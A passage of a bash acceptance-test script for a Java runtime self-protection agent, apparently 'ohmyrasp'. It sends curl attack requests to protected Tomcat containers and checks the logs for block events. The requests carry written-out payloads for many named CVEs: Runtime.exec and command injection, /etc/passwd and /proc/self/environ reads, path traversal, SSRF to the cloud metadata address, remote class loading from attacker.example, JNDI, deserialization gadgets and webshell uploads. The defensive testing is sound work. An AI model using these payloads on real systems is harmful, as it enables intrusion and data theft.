  expect_block "$version" request_spring_cve_2017_8046_json_patch_spel -X PATCH -H "Content-Type: application/json-patch+json" --data-binary "$spring_cve_2017_8046_body" "${protected_url}/customers/1"
  expect_block "$version" request_expression_parameter_name "${protected_url}/rasp/policy/request-expression-parameter-name"
  expect_block "$version" request_spring_cve_2018_1273_data_commons_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2018_1273_field}=&password=&repeatedPassword=" "${protected_url}/users?page=&size=5"
  expect_block "$version" request_struts2_s2005_eval_parameter_name "${protected_url}/example/HelloWorld.action?${struts2_s2005_eval_query}"
  expect_block "$version" request_struts2_s2016_redirect_parameter_name "${protected_url}/index.action?${struts2_s2016_redirect_query}"
  expect_block "$version" request_struts2_s2032_method_parameter_name "${protected_url}/index.action?${struts2_s2032_method_query}"
  expect_block "$version" request_spring_binding_expression_name "${protected_url}/rasp/policy/request-spring-binding-expression-name"
  expect_block "$version" request_spring_cve_2017_4971_webflow_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2017_4971_field}=vulhub" "${protected_url}/hotels/booking"
  expect_block "$version" request_expression_path "${protected_url}/rasp/policy/request-expression-path"
  expect_block "$version" request_confluence_cve_2022_26134_path_ognl -G --data-urlencode "uri=${confluence_cve_2022_26134_path}" "${protected_url}/rasp/policy/request-expression-path"
  expect_block "$version" request_struts2_s2057_namespace_path --path-as-is "${protected_url}${struts2_s2057_namespace_path}"
  expect_block "$version" request_xxe_payload "${protected_url}/rasp/policy/request-xxe-payload"
  expect_block "$version" request_solr_cve_2017_12629_xmlparser_xxe "${protected_url}/rasp/policy/request-solr-cve-2017-12629-xxe"
  expect_block "$version" request_typed_parameter_deserialization "${protected_url}/rasp/policy/request-typed-parameter-deserialization"
  expect_block "$version" request_liferay_jsonws_typed_parameter -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$liferay_jsonws_body" "${protected_url}/api/jsonws/invoke"
  expect_block "$version" request_typed_payload_deserialization "${protected_url}/rasp/policy/request-typed-payload-deserialization"
  expect_block "$version" request_hertzbeat_cve_2024_42323_yaml_import "${protected_url}/rasp/policy/request-hertzbeat-cve-2024-42323-yaml-import"
  expect_block "$version" request_xml_polymorphic_gadget "${protected_url}/rasp/policy/request-xml-polymorphic-gadget"
  expect_block "$version" request_xstream_jndi_xml_gadget "${protected_url}/rasp/policy/request-xstream-jndi-xml-gadget"
  expect_block "$version" request_xstream_rmi_xml_gadget "${protected_url}/rasp/policy/request-xstream-rmi-xml-gadget"
  expect_block "$version" request_template_parameter "${protected_url}/rasp/policy/request-template-parameter"
  expect_block "$version" request_template_loader_enable "${protected_url}/rasp/policy/request-template-loader-enable"
  expect_block "$version" request_solr_cve_2019_17558_velocity_template "${protected_url}/rasp/policy/request-solr-cve-2019-17558-velocity-template"
  expect_block "$version" request_solr_cve_2019_17558_template_loader_enable "${protected_url}/rasp/policy/request-solr-cve-2019-17558-template-loader-enable"
  expect_block "$version" request_jira_contact_template "${protected_url}/rasp/policy/request-jira-contact-template"
  expect_block "$version" request_template_json_parameter "${protected_url}/rasp/policy/request-template-json-parameter"
  expect_block "$version" request_jmreport_freemarker_sql -X POST -H "Content-Type: application/json" --data-binary "$jmreport_freemarker_body" "${protected_url}/jmreport/queryFieldBySql"
  expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-template-source"
  expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-coldfusion-metadata-class-source"
  expect_block "$version" request_coldfusion_iedit_metadata_class_source -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "_variables=${coldfusion_metadata_payload}" "${protected_url}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true"
  expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-locale-source-traversal"
  expect_block "$version" request_coldfusion_locale_source_traversal "${protected_url}/CFIDE/administrator/enter.cfm?locale=${coldfusion_locale_query}"
  expect_block "$version" request_template_source "${protected_url}/rasp/policy/request-ofbiz-remote-decorator-source"
  expect_block "$version" request_remote_content_stream "${protected_url}/rasp/policy/request-remote-content-stream"
  expect_block "$version" request_solr_remotestreaming_config_enable "${protected_url}/rasp/policy/request-solr-remotestreaming-config-enable"
  expect_block "$version" request_solr_remotestreaming_file_read "${protected_url}/rasp/policy/request-solr-remotestreaming-file-read"
  expect_block "$version" request_remote_import_script_write "${protected_url}/rasp/policy/request-remote-import-script-write"
  expect_block "$version" request_repository_webroot_write "${protected_url}/rasp/policy/request-repository-webroot-write"
  expect_block "$version" request_elasticsearch_wooyun_2015_110216_snapshot_webroot_write "${protected_url}/rasp/policy/request-repository-webroot-write"
  expect_block "$version" request_plot_command_injection "${protected_url}/rasp/policy/request-plot-command-injection"
  expect_block "$version" request_opentsdb_cve_2020_35476_yrange_plot_command "${protected_url}/rasp/policy/request-plot-command-injection"
  expect_block "$version" request_opentsdb_cve_2023_25826_key_plot_command "${protected_url}/rasp/policy/request-opentsdb-key-plot-command-injection"
  expect_block "$version" request_sql_sort_injection "${protected_url}/rasp/policy/request-sql-sort-injection"
  expect_block "$version" request_sql_identifier_injection "${protected_url}/rasp/policy/request-skywalking-graphql-sql-identifier"
  expect_block "$version" request_remote_job_submission "${protected_url}/rasp/policy/remote-job-submission"
  expect_block "$version" request_hadoop_yarn_command_submission "${protected_url}/rasp/policy/remote-hadoop-yarn-command-submission"
  expect_block "$version" request_teamcity_cve_2024_27198_internal_forward "${protected_url}/rasp/policy/request-internal-forward"
  expect_block "$version" request_java_bean_pollution -G --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i" "${protected_url}/rasp/request"
  expect_block "$version" request_spring_cve_2022_22965_tomcatwar_accesslog_jsp -H "suffix: %>//" -H "c1: Runtime" -H "c2: <%" "${protected_url}/?${spring_cve_2022_22965_query}"
  expect_block "$version" request_path_confusion "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_dataease_geo_whitelist_traversal --path-as-is "${protected_url}/geo/../dataease/de2api/datasource/types"
  expect_block "$version" request_path_confusion_dot_segment -G --data-urlencode "uri=/./admin" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_shiro_cve_2010_3863_dot_segment_admin -G --data-urlencode "uri=/./admin" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_shiro_cve_2020_1957_semicolon_traversal_admin -G --data-urlencode "uri=/xxx/..;/admin/" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_nexus_cve_2024_4956_encoded_slash_traversal -G --data-urlencode "uri=${nexus_cve_2024_4956_path}" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_elasticsearch_cve_2015_3337_plugin_traversal -G --data-urlencode "uri=/_plugin/head/../../../../../../../../../etc/passwd" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_elasticsearch_cve_2015_5531_snapshot_traversal -G --data-urlencode "uri=/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_path_confusion_elasticsearch_plugin -G --data-urlencode "uri=/_plugin/head/../../../../../../../../../etc/passwd" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_path_confusion_elasticsearch_snapshot -G --data-urlencode "uri=/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_path_confusion_control_char -G --data-urlencode "uri=/admin/%0atest" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_spring_cve_2022_22978_regex_requestmatcher_lf -G --data-urlencode "uri=/admin/%0atest" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_spring_cve_2022_22978_regex_requestmatcher_cr -G --data-urlencode "uri=/admin/%0dtest" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_path_confusion_lenient -G --data-urlencode "uri=/setup/setup-s/%2>%2>/%2>%2>/user-create.jsp" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_openfire_cve_2023_32315_unicode_setup_traversal -G --data-urlencode "uri=/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_path_confusion_overlong -G --data-urlencode "uri=/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" "${protected_url}/rasp/policy/request-path-confusion"
  expect_block "$version" request_path_confusion_ghostbits "${protected_url}/rasp/policy/request-spring-jetty-ghostbits-path-confusion"
  expect_block "$version" request_path_confusion "${protected_url}/rasp/policy/request-flink-log-path-traversal"
  expect_block "$version" request_internal_resource "${protected_url}/rasp/policy/request-internal-resource"
  expect_block "$version" request_jetty_cve_2021_28164_encoded_dot_webinf -G --data-urlencode "uri=/%2e/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
  expect_block "$version" request_jetty_cve_2021_28169_concat_double_decode -G --data-urlencode "query=/%2557EB-INF/web.xml" "${protected_url}/rasp/policy/request-internal-resource"
  expect_block "$version" request_jetty_cve_2021_34429_unicode_dot_webinf -G --data-urlencode "uri=/%u002e/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
  expect_block "$version" request_jetty_cve_2021_34429_nul_dot_webinf -G --data-urlencode "uri=/.%00/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
  expect_block "$version" request_jetty_cve_2021_34429_nul_dotdot_webinf -G --data-urlencode "uri=/a/b/..%00/WEB-INF/web.xml" --data-urlencode "query=" "${protected_url}/rasp/policy/request-internal-resource"
  expect_block "$version" request_forged_include_attribute "${protected_url}/rasp/policy/request-forged-include-attribute"
  expect_block "$version" command_userinput -G --data-urlencode "cmd=sh" --data-urlencode "arg=-c" --data-urlencode "arg=cat /etc/passwd; id" "${protected_url}/rasp/command"
  expect_block "$version" command_common "${protected_url}/rasp/command/common"
  expect_block "$version" command_error "${protected_url}/rasp/command/error"
  expect_block "$version" command_dnslog "${protected_url}/rasp/command/dnslog"
  expect_block "$version" command_reflect "${protected_url}/rasp/command/reflect"
  expect_block "$version" command_config_listener "${protected_url}/rasp/policy/command-config-listener"
  expect_block "$version" command_solr_cve_2017_12629_runexecutable "${protected_url}/rasp/policy/command-solr-cve-2017-12629-runexecutable"
  expect_block "$version" command_config_injection "${protected_url}/rasp/policy/command-config-injection"
  expect_block "$version" command_rocketmq_cve_2023_33246_filterserver "${protected_url}/rasp/policy/command-rocketmq-cve-2023-33246-filterserver"
  expect_block "$version" readFile_userinput -G --data-urlencode "path=/etc/passwd" "${protected_url}/rasp/file/read"
  expect_block "$version" readFile_unwanted "${protected_url}/rasp/file/read-sensitive"
  expect_block "$version" readFile_outsideWebroot "${protected_url}/rasp/file/read-outside"
  expect_block "$version" readFile_userinput_http -G --data-urlencode "file=http://127.0.0.1/internal" "${protected_url}/rasp/policy/read-http"
  expect_block "$version" readFile_userinput_unwanted -G --data-urlencode "file=file:///etc/passwd" "${protected_url}/rasp/policy/read-unwanted"
  expect_block "$version" readFile_argument_expansion "${protected_url}/rasp/policy/argument-file-expansion"
  expect_block "$version" readFile_jenkins_cve_2024_23897_proc_environ -G --data-urlencode "arg=help" --data-urlencode "arg=1" --data-urlencode "arg=@/proc/self/environ" "${protected_url}/rasp/policy/argument-file-expansion"
  expect_block "$version" readFile_jenkins_cve_2024_23897_connect_node_passwd -G --data-urlencode "arg=connect-node" --data-urlencode "arg=@/etc/passwd" "${protected_url}/rasp/policy/argument-file-expansion"
  expect_block "$version" writeFile_script -G --data-urlencode "path=/usr/local/tomcat/webapps/ROOT/shell.jsp" "${protected_url}/rasp/file/write"
  expect_block "$version" writeFile_reflect "${protected_url}/rasp/file/write-reflect"
  expect_block "$version" writeFile_NTFS "${protected_url}/rasp/policy/write-ntfs"
  expect_block "$version" writeFile_config_path "${protected_url}/rasp/policy/write-config-path"
  expect_block "$version" writeFile_rocketmq_cve_2023_37582_namesrv_config_path "${protected_url}/rasp/policy/write-rocketmq-cve-2023-37582-config-path"
  expect_block "$version" writeFile_generated_script -G --data-urlencode "payload=${generated_script_payload}" "${protected_url}/rasp/policy/write-generated-script"
  expect_block "$version" writeFile_opentsdb_cve_2020_35476_generated_yrange_script -G --data-urlencode "payload=${generated_script_payload}" "${protected_url}/rasp/policy/write-generated-script"
  expect_block "$version" writeFile_opentsdb_cve_2023_25826_generated_key_script -G --data-urlencode "payload=${generated_script_key_payload}" "${protected_url}/rasp/policy/write-generated-script-key"
  expect_block "$version" deleteFile_userinput -G --data-urlencode "path=/tmp/ohmyrasp-delete-target.txt" "${protected_url}/rasp/file/delete"
  expect_block "$version" directory_userinput -G --data-urlencode "path=/etc" "${protected_url}/rasp/directory"
  expect_block "$version" directory_unwanted "${protected_url}/rasp/directory/root"
  expect_block "$version" directory_reflect "${protected_url}/rasp/policy/directory-reflect"
  expect_block "$version" ssrf_aws -G --max-time 3 --data-urlencode "url=http://169.254.169.254/latest/meta-data/" "${protected_url}/rasp/ssrf"
  expect_block "$version" ssrf_userinput -G --data-urlencode "url=http://127.0.0.1/admin" "${protected_url}/rasp/policy/ssrf-userinput"
  expect_block "$version" ssrf_geoserver_testwfspost -G --data-urlencode "url=http://interal/geoserver/../" --data-urlencode "body=testtest" --data-urlencode "username=admin" --data-urlencode "password=admin" "${protected_url}/rasp/policy/ssrf-geoserver-testwfspost"
  expect_block "$version" ssrf_geoserver_cve_2021_40822_testwfspost -G --data-urlencode "url=http://interal/geoserver/../" --data-urlencode "body=testtest" --data-urlencode "username=admin" --data-urlencode "password=admin" "${protected_url}/rasp/policy/ssrf-geoserver-testwfspost"
  expect_block "$version" ssrf_weblogic_uddi -G --data-urlencode "rdoSearch=name" --data-urlencode "txtSearchname=sdf" --data-urlencode "selfor=Business location" --data-urlencode "operator=${weblogic_uddi_operator_url}" "${protected_url}/uddiexplorer/SearchPublicRegistries.jsp"
  expect_block "$version" ssrf_common "${protected_url}/rasp/policy/ssrf-common"
  expect_block "$version" ssrf_protocol "${protected_url}/rasp/policy/ssrf-protocol"
  expect_block "$version" ssrf_obfuscate "${protected_url}/rasp/policy/ssrf-obfuscate"
  expect_block "$version" dns_blacklist -G --max-time 3 --data-urlencode "host=probe.dnslog.cn" "${protected_url}/rasp/dns"
  expect_block "$version" jndi_disable_all -G --max-time 3 --data-urlencode "name=ldap://127.0.0.1:1389/a" "${protected_url}/rasp/jndi"
  expect_block "$version" jndi_jaas_config -G --data-urlencode "provider=${jaas_provider_url}" "${protected_url}/rasp/jaas/config"
  expect_block "$version" jndi_kafka_cve_2023_25194_druid_sampler_jaas -X POST -H "Content-Type: application/json" --data-binary "$kafka_druid_sampler_body" "${protected_url}/druid/indexer/v1/sampler?for=connect"
  expect_block "$version" classloader_remote -G --data-urlencode "codebase=http://attacker.example/evil.jar" "${protected_url}/rasp/classloader/url"
  expect_block "$version" spring_remote_config -G --data-urlencode "config=http://127.0.0.1:9/poc.xml" "${protected_url}/rasp/spring/config"
  expect_block "$version" jmx_remote_config "${protected_url}/rasp/jmx/invoke"
  expect_block "$version" jmx_activemq_jolokia_broker_config -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_body" "${protected_url}/api/jolokia/"
  expect_block "$version" jmx_activemq_jolokia_file_write -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_file_write_body" "${protected_url}/api/jolokia/"
  expect_block "$version" jmx_file_write "${protected_url}/rasp/jmx/write"
  expect_block "$version" sql_userinput -G --data-urlencode "value=' OR '1'='1" "${protected_url}/rasp/sql"
  expect_block "$version" sql_policy "${protected_url}/rasp/policy/sql-policy"
  expect_block "$version" sql_exception "${protected_url}/rasp/policy/sql-exception"
  expect_block "$version" sql_regex "${protected_url}/rasp/policy/sql-regex"
  expect_block "$version" sql_h2_code_execution "${protected_url}/rasp/h2/sql"
  expect_block "$version" sql_h2_console_query -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "sql=${h2_console_alias_sql}" "${protected_url}/h2-console/query.do"
  expect_block "$version" jdbc_h2_init "${protected_url}/rasp/h2/jdbc-init"
  expect_block "$version" sql_derby_code_execution "${protected_url}/rasp/policy/sql-derby-code"
  expect_block "$version" sql_nacos_cve_2021_29442_derby_ops_code_execution -G --data-urlencode "sql=${nacos_derby_code_sql}" "${protected_url}/nacos/v1/cs/ops/derby"
  expect_block "$version" jdbc_mysql_deserialization -G --data-urlencode "url=${mysql_jdbc_url}" "${protected_url}/rasp/jdbc/mysql"
  expect_block "$version" jdbc_linkis_cve_2022_44645_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${protected_url}/api/rest_j/v1/data-source-manager/op/connect/json"
  expect_block "$version" deserialization_blacklist "${protected_url}/rasp/deserialize"
  expect_block "$version" deserialization_coldfusion_amf -X POST -H "Content-Type: application/x-amf" --data-binary "@${coldfusion_amf_body_file}" "${protected_url}/flex2gateway/amf"
  expect_block "$version" deserialization_gadget "${protected_url}/rasp/policy/deserialization-gadget"
  expect_block "$version" deserialization_cluster_message "${protected_url}/rasp/policy/deserialization-cluster-message"
  expect_block "$version" deserialization_tomcat_cve_2026_34486_tribes_encrypt -G --data-urlencode "class=org.apache.commons.collections.functors.InvokerTransformer" "${protected_url}/rasp/policy/deserialization-cluster-message"
  expect_block "$version" deserialization_logging_message "${protected_url}/rasp/policy/deserialization-logging-message"
  expect_block "$version" deserialization_webflow_state "${protected_url}/rasp/policy/deserialization-webflow-state"
  expect_block "$version" deserialization_cas_webflow_execution_state -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$cas_webflow_body" "${protected_url}/cas/login"
  expect_block "$version" deserialization_rmi_transport "${protected_url}/rasp/policy/deserialization-rmi-transport"
  expect_block "$version" deserialization_neo4j_shell_rmi -G --data-urlencode "gadget=org.mozilla.javascript.NativeJavaObject" "${protected_url}/neo4j-shell/setSessionVariable"
  expect_block "$version" deserialization_remoting_transport "${protected_url}/rasp/policy/deserialization-remoting-transport"
  expect_block "$version" deserialization_jms_object_message "${protected_url}/rasp/policy/deserialization-jms-object-message"
  expect_block "$version" deserialization_signed_object "${protected_url}/rasp/policy/deserialization-signed-object"
  expect_block "$version" deserialization_session_file -G --data-urlencode "id=.deserialize" "${protected_url}/rasp/policy/deserialization-session-file"
  expect_block "$version" deserialization_protocol_class -G --data-urlencode "xml=http://attacker.example/poc.xml" "${protected_url}/rasp/policy/deserialization-protocol-class"
  expect_block "$version" deserialization_http_invoker -H "Content-Type: application/x-java-serialized-object" "${protected_url}/rasp/policy/deserialization-http-invoker"
  expect_block "$version" deserialization_http_object_stream "${protected_url}/rasp/policy/deserialization-http-object-stream"
  expect_block "$version" deserialization_jboss_readonly -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/invoker/readonly"
  expect_block "$version" deserialization_jboss_jmxinvoker -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/invoker/JMXInvokerServlet"
  expect_block "$version" deserialization_jbossmq_httpil -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary "$java_serialized_body" "${protected_url}/jbossmq-httpil/HTTPServerILServlet"
  expect_block "$version" deserialization_hessian_type "${protected_url}/rasp/policy/deserialization-hessian-type"
  expect_block "$version" deserialization_xmlrpc_serialized -H "Content-Type: application/xml" "${protected_url}/rasp/policy/deserialization-xmlrpc-serialized"
  expect_block "$version" deserialization_rmi_registry_bind "${protected_url}/rasp/policy/deserialization-rmi-registry-bind"
  expect_block "$version" deserialization_polymorphic_type -G --data-urlencode "parser=fastjson" --data-urlencode "type=com.sun.rowset.JdbcRowSetImpl" "${protected_url}/rasp/deserialize/polymorphic"
  expect_block "$version" deserialization_fastjson_1224_autotype -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1224_body" "${protected_url}/fastjson"
  expect_block "$version" deserialization_fastjson_1247_autotype_bypass -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1247_body" "${protected_url}/fastjson"
  expect_block "$version" deserialization_jackson_templates_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_templates_body" "${protected_url}/exploit"
  expect_block "$version" deserialization_jackson_spring_xml_polymorphic -X POST -H "Content-Type: application/json" --data-binary "$jackson_spring_xml_body" "${protected_url}/exploit"
  expect_block "$version" deserialization_snakeyaml_h2_type -G --data-urlencode "parser=snakeyaml" --data-urlencode "type=org.h2.jdbc.JdbcConnection" "${protected_url}/rasp/deserialize/polymorphic"
  expect_block "$version" xml_decoder_runtime "${protected_url}/rasp/xml/decoder"
  expect_block "$version" xml_decoder_runtime_weblogic_workcontext -X POST -H "Content-Type: text/xml" --data-binary "$weblogic_workcontext_body" "${protected_url}/wls-wsat/CoordinatorPortType"
  expect_block "$version" xml_decoder_webshell "${protected_url}/rasp/xml/decoder-webshell"
  expect_block "$version" xxe_protocol "${protected_url}/rasp/policy/xxe-protocol"
  expect_block "$version" xxe_file "${protected_url}/rasp/policy/xxe-file"
  expect_block "$version" xop_attachment_file -G --data-urlencode "href=file:///etc/hosts" "${protected_url}/rasp/policy/xml-attachment"
  expect_block "$version" xop_attachment_cxf_aegis -X POST -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" --data-binary "$cxf_xop_body" "${protected_url}/test"
  expect_block "$version" include_userinput -G --data-urlencode "file=/etc/passwd" "${protected_url}/rasp/policy/include-userinput"
  expect_block "$version" include_protocol "${protected_url}/rasp/policy/include-protocol"
  expect_block "$version" fileUpload_multipart_script "${protected_url}/rasp/policy/upload-script"
  expect_block "$version" fileUpload_multipart_expression "${protected_url}/rasp/policy/upload-expression-filename"
  expect_block "$version" fileUpload_struts2_s2046_filename -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2046_boundary}" --data-binary "@${struts2_s2046_body_file}" "${protected_url}/index.action"
  expect_block "$version" fileUpload_path_traversal "${protected_url}/rasp/policy/upload-traversal"
  expect_block "$version" fileUpload_multipart_html "${protected_url}/rasp/policy/upload-html"
  expect_block "$version" fileUpload_multipart_exe "${protected_url}/rasp/policy/upload-exe"
  expect_block "$version" fileUpload_java_archive "${protected_url}/rasp/policy/plugin-upload"
  expect_block "$version" fileUpload_weblogic_ws_utc_jsp -X POST -H "Content-Type: multipart/form-data; boundary=ohmyrasp" "${protected_url}/ws_utc/resources/setting/keystore?filename=shell.jsp"
  expect_block "$version" fileUpload_activemq_fileserver_move -X MOVE -H "Destination: ${activemq_fileserver_destination}" "${protected_url}/fileserver/2.txt"
  expect_block "$version" fileUpload_webdav "${protected_url}/rasp/policy/webdav"
  expect_block "$version" fileUpload_webdav "${protected_url}/rasp/policy/webdav-unsafe-destination"
  expect_block "$version" rename_webshell "${protected_url}/rasp/policy/rename"
  expect_block "$version" link_webshell "${protected_url}/rasp/policy/link"
  expect_block "$version" archive_traversal -G --data-urlencode "entry=../escaped/archive.txt" "${protected_url}/rasp/archive"
  expect_block "$version" archive_kkfileview_zipslip_preview -G --data-urlencode "url=${kkfileview_preview_url}" "${protected_url}/onlinePreview"
  expect_block "$version" ognl_blacklist "${protected_url}/rasp/policy/ognl"
  expect_block "$version" ognl_length_limit "${protected_url}/rasp/policy/ognl-length"
  expect_block "$version" spel_runtime -G --data-urlencode "expr=T(java.lang.Runtime).getRuntime().exec('id')" "${protected_url}/rasp/spel"
  expect_block "$version" jexl_runtime "${protected_url}/rasp/policy/jexl-runtime"
  expect_block "$version" el_runtime "${protected_url}/rasp/policy/el-runtime"
  expect_block "$version" javascript_runtime "${protected_url}/rasp/policy/javascript-runtime"
  expect_block "$version" jiffle_runtime "${protected_url}/rasp/policy/jiffle-runtime"
  expect_block "$version" jiffle_runtime_geoserver_wms -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${protected_url}/geoserver/wms"
  expect_block "$version" jiffle_runtime_geoserver_cve_2022_24816_wms -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${protected_url}/geoserver/wms"
  expect_block "$version" script_runtime -G --data-urlencode "script=java.lang.Runtime.getRuntime().exec('id')" "${protected_url}/rasp/script/jsr223"
  expect_block "$version" script_runtime_stack "${protected_url}/rasp/policy/script-command-stack"
  expect_block "$version" xpath_runtime -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${protected_url}/rasp/xpath"
  expect_block "$version" jxpath_runtime -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${protected_url}/rasp/jxpath"
  expect_block "$version" java_compile_runtime "${protected_url}/rasp/java/compile"
  expect_block "$version" template_runtime "${protected_url}/rasp/template/velocity"
  expect_block "$version" eval_regex "${protected_url}/rasp/policy/eval"
  expect_block "$version" loadLibrary_unc "${protected_url}/rasp/policy/loadlib"
  expect_block "$version" response_dataLeak "${protected_url}/rasp/policy/response"
  expect_block "$version" xss_echo "${protected_url}/rasp/policy/xss-echo"
  expect_block "$version" webshell_eval -G --data-urlencode "code=system('id')" "${protected_url}/rasp/policy/webshell-eval"
  expect_block "$version" webshell_command -G --data-urlencode "cmd=sh -c id" "${protected_url}/rasp/policy/webshell-command"
  expect_block "$version" webshell_file_put_contents -G --data-urlencode "file=shell.jsp" "${protected_url}/rasp/policy/webshell-file"
  expect_block "$version" webshell_callable "${protected_url}/rasp/policy/webshell-callable"
  expect_block "$version" webshell_ld_preload "${protected_url}/rasp/policy/webshell-ld"
}

required_algorithms=(
  request_scanner
  request_unusual
  xss_userinput
  request_internal_identity
  request_default_jwt_secret
  request_jwt_verification_failure
  request_default_crypto_cookie
  request_serialized_client_state
  request_default_credential
  request_empty_credential_bypass
  request_setup_state_reset
  request_server_side_script_put
  request_upload_filename_override
  request_scheduler_shell_job
  request_debug_process_launch
  request_dynamic_script_config
  request_message_selector_expression
  request_expression_header
  request_jndi_lookup
  request_expression_parameter
  request_ogc_filter_sql_injection
  request_json_patch_expression
  request_expression_parameter_name
  request_expression_path
  request_xxe_payload
  request_typed_parameter_deserialization
  request_typed_payload_deserialization
  request_xml_polymorphic_gadget
  request_template_parameter
  request_template_loader_enable
  request_template_source
  request_remote_content_stream
  request_remote_import_script_write
  request_repository_webroot_write
  request_plot_command_injection
  request_sql_sort_injection
  request_sql_identifier_injection
  request_remote_job_submission
  request_internal_forward
  request_java_bean_pollution
  request_path_confusion
  request_internal_resource
  request_forged_include_attribute
  command_reflect
  command_userinput
  command_common
  command_error
  command_dnslog
  command_config_listener
  command_config_injection
  readFile_userinput
  readFile_userinput_http
  readFile_userinput_unwanted
  readFile_unwanted
  readFile_outsideWebroot
  readFile_argument_expansion
  writeFile_NTFS
  writeFile_script
  writeFile_reflect
  writeFile_config_path
  writeFile_generated_script
  deleteFile_userinput
  directory_reflect
  directory_userinput
  directory_unwanted
  ssrf_userinput
  ssrf_aws
  ssrf_common
  ssrf_obfuscate
  ssrf_protocol
  dns_blacklist
  jndi_disable_all
  jndi_jaas_config
  classloader_remote
  spring_remote_config
  jmx_remote_config
  jmx_file_write
  sql_userinput
  sql_policy
  sql_regex
  sql_exception
  sql_h2_code_execution
  jdbc_h2_init
  sql_derby_code_execution
  jdbc_mysql_deserialization
  deserialization_blacklist
  deserialization_gadget
  deserialization_cluster_message
  deserialization_logging_message
  deserialization_webflow_state
  deserialization_rmi_transport
  deserialization_remoting_transport
  deserialization_jms_object_message
  deserialization_signed_object
  deserialization_session_file
  deserialization_protocol_class
  deserialization_http_invoker
  deserialization_http_object_stream
  deserialization_hessian_type
  deserialization_xmlrpc_serialized
  deserialization_rmi_registry_bind
  deserialization_polymorphic_type
  xml_decoder_runtime
  xml_decoder_webshell
  xxe_protocol
  xxe_file
  include_userinput
  include_protocol
  fileUpload_multipart_script
  fileUpload_multipart_expression
  fileUpload_path_traversal
  fileUpload_multipart_html
  fileUpload_multipart_exe
  fileUpload_java_archive
  fileUpload_webdav
  rename_webshell
  link_webshell
  archive_traversal
  ognl_blacklist
  ognl_length_limit
  spel_runtime
  jexl_runtime
  el_runtime
  javascript_runtime
  jiffle_runtime
  script_runtime
  xpath_runtime
  java_compile_runtime
  template_runtime
  eval_regex
  loadLibrary_unc
  response_dataLeak
  xss_echo
  webshell_eval
  webshell_command
  webshell_file_put_contents
  webshell_callable
  webshell_ld_preload
)

for version in "${versions[@]}"; do
  run_version "$version"
done

sleep 2
for version in "${versions[@]}"; do
  docker compose exec -T "tomcat${version}-protected" sh -c 'chmod 666 /opt/ohmyrasp/logs/events.jsonl' || true
done

missing=0
for version in "${versions[@]}"; do
  protected_log="logs/tomcat${version}-protected/events.jsonl"
  for algorithm in "${required_algorithms[@]}"; do
    if grep -q "\"algorithm\":\"${algorithm}\".*\"action\":\"block\"" "$protected_log"; then
      echo "ok tomcat${version} ${algorithm}"
    else
      echo "missing tomcat${version} ${algorithm} block event" >&2
      missing=1
    fi
  done
done

if [[ "$missing_redirect" -ne 0 || "$missing" -ne 0 ]]; then
  echo "acceptance failed; see logs/tomcat*-protected/events.jsonl and logs/tomcat*/tomcat.log" >&2
  exit 1
fi

echo "acceptance passed across Tomcat 9, 10, and 11"
